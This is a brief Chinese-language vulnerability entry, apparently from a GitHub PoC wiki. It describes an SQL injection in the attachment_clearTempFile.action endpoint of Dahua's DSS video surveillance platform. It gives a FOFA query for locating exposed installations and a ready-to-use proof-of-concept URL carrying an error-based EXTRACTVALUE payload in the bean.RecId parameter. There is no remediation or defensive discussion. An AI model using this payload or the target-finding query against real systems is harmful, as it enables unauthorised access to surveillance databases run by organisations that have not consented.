## 大华DSS数字监控系统attachment_clearTempFile.action存在SQL注入漏洞

## fofa
```
app="dahua-DSS"
```


## poc
```
http:///portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(1,concat(0x7e,md5(1),0x7e))%20or%20(%2799%27=%2799&bean.TabName=1
```
![image](https://github.com/wy876/wiki/assets/139549762/495b58df-a0dd-4862-b9ff-77367b0f1858)


